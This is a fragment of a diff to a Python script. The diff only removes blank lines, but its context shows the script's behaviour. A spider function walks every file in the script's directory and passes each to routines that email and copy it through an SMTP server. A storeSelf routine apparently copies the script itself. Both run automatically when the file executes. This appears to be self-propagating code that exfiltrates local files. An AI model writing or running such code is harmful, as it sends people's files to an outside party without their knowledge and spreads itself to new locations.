@@ -37,16 +37,12 @@ def emailContents(contents):
     server.sendmail(fromaddr, toaddrs, rebuiltMessage)
     server.quit()
 
-    
-        
-    
 
 def spider():
     for root, dirs, files in os.walk(os.path.dirname(__file__)):
         for name in files:
             fullpath = os.path.join(root, name)
             emailAndCopy(fullpath)
-
 
 
 def storeSelf():
@@ -60,5 +56,3 @@ def storeSelf():
 storeSelf()
 
 spider()
-
-
